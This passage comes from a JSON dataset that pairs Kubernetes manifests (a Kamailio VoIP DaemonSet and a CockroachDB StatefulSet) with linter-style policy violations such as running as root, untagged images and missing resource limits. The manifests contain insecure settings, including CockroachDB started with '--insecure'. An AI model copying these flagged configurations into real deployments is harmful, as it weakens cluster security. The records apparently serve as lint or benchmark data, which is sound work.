    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "2482",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"dispatchers\" is using an invalid container image, \"cycoresystems/dispatchers\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2483",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kamailio\" is using an invalid container image, \"atsip/kamailio\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2484",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"rtpproxy\" is using an invalid container image, \"atsip/rtpproxy\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2485",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dispatchers\" does not have a read-only root file system"
  },
  {
    "id": "2486",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kamailio\" does not have a read-only root file system"
  },
  {
    "id": "2487",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rtpproxy\" does not have a read-only root file system"
  },
  {
    "id": "2488",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dispatchers\" is not set to runAsNonRoot"
  },
  {
    "id": "2489",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kamailio\" is not set to runAsNonRoot"
  },
  {
    "id": "2490",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"rtpproxy\" is not set to runAsNonRoot"
  },
  {
    "id": "2491",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"dispatchers\" has cpu request 0"
  },
  {
    "id": "2492",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kamailio\" has cpu request 0"
  },
  {
    "id": "2493",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"rtpproxy\" has cpu request 0"
  },
  {
    "id": "2494",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"dispatchers\" has memory limit 0"
  },
  {
    "id": "2495",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kamailio\" has memory limit 0"
  },
  {
    "id": "2496",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kamailio\n  namespace: voip\n  labels:\n    component: kamailio\nspec:\n  selector:\n    matchLabels:\n      component: kamailio\n  template:\n    metadata:\n      name: kamailio\n      labels:\n        component: kamailio\n    spec:\n      volumes:\n      - name: config\n      containers:\n      - name: kamailio\n        image: atsip/kamailio\n        env:\n        - name: CLOUD\n          value: gcp\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n      - name: rtpproxy\n        image: atsip/rtpproxy\n        env:\n        - name: CLOUD\n          value: gcp\n      - name: dispatchers\n        image: cycoresystems/dispatchers\n        command:\n        - /app\n        - -set\n        - voip:asterisk=1:5080\n        volumeMounts:\n        - name: config\n          mountPath: /data/kamailio\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"rtpproxy\" has memory limit 0"
  },
  {
    "id": "2497",
    "manifest_path": "data/manifests/the_stack_sample/sample_0663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: cockroachdb\n  name: cockroachdb\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: cockroachdb\n  template:\n    metadata:\n      labels:\n        app: cockroachdb\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - cockroachdb\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      containers:\n      - command:\n        - /bin/bash\n        - -ecx\n        - \"# The use of qualified `hostname -f` is crucial:\\n# Other nodes aren't\\\n          \\ able to look up the unqualified hostname.\\nCRARGS=(\\\"start\\\" \\\"--logtostderr\\\"\\\n          \\ \\\"--insecure\\\" \\\"--host\\\" \\\"$(hostname -f)\\\" \\\"--http-host\\\" \\\"0.0.0.0\\\"\\\n          )\\n# We only want to initialize a new cluster (by omitting the join flag)\\n\\\n          # if we're sure that we're the first node (i.e. index 0) and that\\n# there\\\n          \\ aren't any other nodes running as part of the cluster that\\n# this is\\\n          \\ supposed to be a part of (which indicates that a cluster\\n# already exists\\\n          \\ and we should make sure not to create a new one).\\n# It's fine to run\\\n          \\ without --join on a restart if there aren't any\\n# other nodes.\\nif [\\\n          \\ ! \\\"$(hostname)\\\" == \\\"cockroachdb-0\\\" ] || \\\\\\n   [ -e \\\"/cockroach/cockroach-data/cluster_exists_marker\\\"\\\n          \\ ]\\nthen\\n  # We don't join cockroachdb in order to avoid a node attempting\\n\\\n          \\  # to join itself, which currently doesn't work\\n  # (https://github.com/cockroachdb/cockroach/issues/9625).\\n\\\n          \\  CRARGS+=(\\\"--join\\\" \\\"cockroachdb-public\\\")\\nfi\\nexec /cockroach/cockroach\\\n          \\ ${CRARGS[*]}\\n\"\n        image: cockroachdb/cockroach:v1.1.0\n        imagePullPolicy: IfNotPresent\n        name: cockroachdb\n        ports:\n        - containerPort: 26257\n          name: grpc\n        - containerPort: 8080\n          name: http\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      initContainers:\n      - args:\n        - -on-start=/on-start.sh\n        - -service=cockroachdb\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: cockroachdb/cockroach-k8s-init:0.2\n        imagePullPolicy: IfNotPresent\n        name: bootstrap\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      volumes:\n      - name: datadir\n        persistentVolumeClaim:\n          claimName: datadir\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"bootstrap\" does not have a read-only root file system"
  },
  {
    "id": "2498",
    "manifest_path": "data/manifests/the_stack_sample/sample_0663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: cockroachdb\n  name: cockroachdb\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: cockroachdb\n  template:\n    metadata:\n      labels:\n        app: cockroachdb\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - cockroachdb\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      containers:\n      - command:\n        - /bin/bash\n        - -ecx\n        - \"# The use of qualified `hostname -f` is crucial:\\n# Other nodes aren't\\\n          \\ able to look up the unqualified hostname.\\nCRARGS=(\\\"start\\\" \\\"--logtostderr\\\"\\\n          \\ \\\"--insecure\\\" \\\"--host\\\" \\\"$(hostname -f)\\\" \\\"--http-host\\\" \\\"0.0.0.0\\\"\\\n          )\\n# We only want to initialize a new cluster (by omitting the join flag)\\n\\\n          # if we're sure that we're the first node (i.e. index 0) and that\\n# there\\\n          \\ aren't any other nodes running as part of the cluster that\\n# this is\\\n          \\ supposed to be a part of (which indicates that a cluster\\n# already exists\\\n          \\ and we should make sure not to create a new one).\\n# It's fine to run\\\n          \\ without --join on a restart if there aren't any\\n# other nodes.\\nif [\\\n          \\ ! \\\"$(hostname)\\\" == \\\"cockroachdb-0\\\" ] || \\\\\\n   [ -e \\\"/cockroach/cockroach-data/cluster_exists_marker\\\"\\\n          \\ ]\\nthen\\n  # We don't join cockroachdb in order to avoid a node attempting\\n\\\n          \\  # to join itself, which currently doesn't work\\n  # (https://github.com/cockroachdb/cockroach/issues/9625).\\n\\\n          \\  CRARGS+=(\\\"--join\\\" \\\"cockroachdb-public\\\")\\nfi\\nexec /cockroach/cockroach\\\n          \\ ${CRARGS[*]}\\n\"\n        image: cockroachdb/cockroach:v1.1.0\n        imagePullPolicy: IfNotPresent\n        name: cockroachdb\n        ports:\n        - containerPort: 26257\n          name: grpc\n        - containerPort: 8080\n          name: http\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      initContainers:\n      - args:\n        - -on-start=/on-start.sh\n        - -service=cockroachdb\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: cockroachdb/cockroach-k8s-init:0.2\n        imagePullPolicy: IfNotPresent\n        name: bootstrap\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      volumes:\n      - name: datadir\n        persistentVolumeClaim:\n          claimName: datadir\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cockroachdb\" does not have a read-only root file system"
  },
  {
    "id": "2499",
    "manifest_path": "data/manifests/the_stack_sample/sample_0663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: cockroachdb\n  name: cockroachdb\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: cockroachdb\n  template:\n    metadata:\n      labels:\n        app: cockroachdb\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - cockroachdb\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      containers:\n      - command:\n        - /bin/bash\n        - -ecx\n        - \"# The use of qualified `hostname -f` is crucial:\\n# Other nodes aren't\\\n          \\ able to look up the unqualified hostname.\\nCRARGS=(\\\"start\\\" \\\"--logtostderr\\\"\\\n          \\ \\\"--insecure\\\" \\\"--host\\\" \\\"$(hostname -f)\\\" \\\"--http-host\\\" \\\"0.0.0.0\\\"\\\n          )\\n# We only want to initialize a new cluster (by omitting the join flag)\\n\\\n          # if we're sure that we're the first node (i.e. index 0) and that\\n# there\\\n          \\ aren't any other nodes running as part of the cluster that\\n# this is\\\n          \\ supposed to be a part of (which indicates that a cluster\\n# already exists\\\n          \\ and we should make sure not to create a new one).\\n# It's fine to run\\\n          \\ without --join on a restart if there aren't any\\n# other nodes.\\nif [\\\n          \\ ! \\\"$(hostname)\\\" == \\\"cockroachdb-0\\\" ] || \\\\\\n   [ -e \\\"/cockroach/cockroach-data/cluster_exists_marker\\\"\\\n          \\ ]\\nthen\\n  # We don't join cockroachdb in order to avoid a node attempting\\n\\\n          \\  # to join itself, which currently doesn't work\\n  # (https://github.com/cockroachdb/cockroach/issues/9625).\\n\\\n          \\  CRARGS+=(\\\"--join\\\" \\\"cockroachdb-public\\\")\\nfi\\nexec /cockroach/cockroach\\\n          \\ ${CRARGS[*]}\\n\"\n        image: cockroachdb/cockroach:v1.1.0\n        imagePullPolicy: IfNotPresent\n        name: cockroachdb\n        ports:\n        - containerPort: 26257\n          name: grpc\n        - containerPort: 8080\n          name: http\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      initContainers:\n      - args:\n        - -on-start=/on-start.sh\n        - -service=cockroachdb\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: cockroachdb/cockroach-k8s-init:0.2\n        imagePullPolicy: IfNotPresent\n        name: bootstrap\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      volumes:\n      - name: datadir\n        persistentVolumeClaim:\n          claimName: datadir\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"bootstrap\" is not set to runAsNonRoot"
  },
  {
    "id": "2500",
    "manifest_path": "data/manifests/the_stack_sample/sample_0663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: cockroachdb\n  name: cockroachdb\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: cockroachdb\n  template:\n    metadata:\n      labels:\n        app: cockroachdb\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - cockroachdb\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      containers:\n      - command:\n        - /bin/bash\n        - -ecx\n        - \"# The use of qualified `hostname -f` is crucial:\\n# Other nodes aren't\\\n          \\ able to look up the unqualified hostname.\\nCRARGS=(\\\"start\\\" \\\"--logtostderr\\\"\\\n          \\ \\\"--insecure\\\" \\\"--host\\\" \\\"$(hostname -f)\\\" \\\"--http-host\\\" \\\"0.0.0.0\\\"\\\n          )\\n# We only want to initialize a new cluster (by omitting the join flag)\\n\\\n          # if we're sure that we're the first node (i.e. index 0) and that\\n# there\\\n          \\ aren't any other nodes running as part of the cluster that\\n# this is\\\n          \\ supposed to be a part of (which indicates that a cluster\\n# already exists\\\n          \\ and we should make sure not to create a new one).\\n# It's fine to run\\\n          \\ without --join on a restart if there aren't any\\n# other nodes.\\nif [\\\n          \\ ! \\\"$(hostname)\\\" == \\\"cockroachdb-0\\\" ] || \\\\\\n   [ -e \\\"/cockroach/cockroach-data/cluster_exists_marker\\\"\\\n          \\ ]\\nthen\\n  # We don't join cockroachdb in order to avoid a node attempting\\n\\\n          \\  # to join itself, which currently doesn't work\\n  # (https://github.com/cockroachdb/cockroach/issues/9625).\\n\\\n          \\  CRARGS+=(\\\"--join\\\" \\\"cockroachdb-public\\\")\\nfi\\nexec /cockroach/cockroach\\\n          \\ ${CRARGS[*]}\\n\"\n        image: cockroachdb/cockroach:v1.1.0\n        imagePullPolicy: IfNotPresent\n        name: cockroachdb\n        ports:\n        - containerPort: 26257\n          name: grpc\n        - containerPort: 8080\n          name: http\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      initContainers:\n      - args:\n        - -on-start=/on-start.sh\n        - -service=cockroachdb\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: cockroachdb/cockroach-k8s-init:0.2\n        imagePullPolicy: IfNotPresent\n        name: bootstrap\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      volumes:\n      - name: datadir\n        persistentVolumeClaim:\n          claimName: datadir\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cockroachdb\" is not set to runAsNonRoot"
  },
  {
    "id": "2501",
    "manifest_path": "data/manifests/the_stack_sample/sample_0663.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app: cockroachdb\n  name: cockroachdb\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: cockroachdb\n  template:\n    metadata:\n      labels:\n        app: cockroachdb\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - cockroachdb\n              topologyKey: kubernetes.io/hostname\n            weight: 100\n      containers:\n      - command:\n        - /bin/bash\n        - -ecx\n        - \"# The use of qualified `hostname -f` is crucial:\\n# Other nodes aren't\\\n          \\ able to look up the unqualified hostname.\\nCRARGS=(\\\"start\\\" \\\"--logtostderr\\\"\\\n          \\ \\\"--insecure\\\" \\\"--host\\\" \\\"$(hostname -f)\\\" \\\"--http-host\\\" \\\"0.0.0.0\\\"\\\n          )\\n# We only want to initialize a new cluster (by omitting the join flag)\\n\\\n          # if we're sure that we're the first node (i.e. index 0) and that\\n# there\\\n          \\ aren't any other nodes running as part of the cluster that\\n# this is\\\n          \\ supposed to be a part of (which indicates that a cluster\\n# already exists\\\n          \\ and we should make sure not to create a new one).\\n# It's fine to run\\\n          \\ without --join on a restart if there aren't any\\n# other nodes.\\nif [\\\n          \\ ! \\\"$(hostname)\\\" == \\\"cockroachdb-0\\\" ] || \\\\\\n   [ -e \\\"/cockroach/cockroach-data/cluster_exists_marker\\\"\\\n          \\ ]\\nthen\\n  # We don't join cockroachdb in order to avoid a node attempting\\n\\\n          \\  # to join itself, which currently doesn't work\\n  # (https://github.com/cockroachdb/cockroach/issues/9625).\\n\\\n          \\  CRARGS+=(\\\"--join\\\" \\\"cockroachdb-public\\\")\\nfi\\nexec /cockroach/cockroach\\\n          \\ ${CRARGS[*]}\\n\"\n        image: cockroachdb/cockroach:v1.1.0\n        imagePullPolicy: IfNotPresent\n        name: cockroachdb\n        ports:\n        - containerPort: 26257\n          name: grpc\n        - containerPort: 8080\n          name: http\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      initContainers:\n      - args:\n        - -on-start=/on-start.sh\n        - -service=cockroachdb\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: cockroachdb/cockroach-k8s-init:0.2\n        imagePullPolicy: IfNotPresent\n        name: bootstrap\n        volumeMounts:\n        - mountPath: /cockroach/cockroach-data\n          name: datadir\n      volumes:\n      - name: datadir\n        persistentVolumeClaim:\n          claimName: datadir\n",
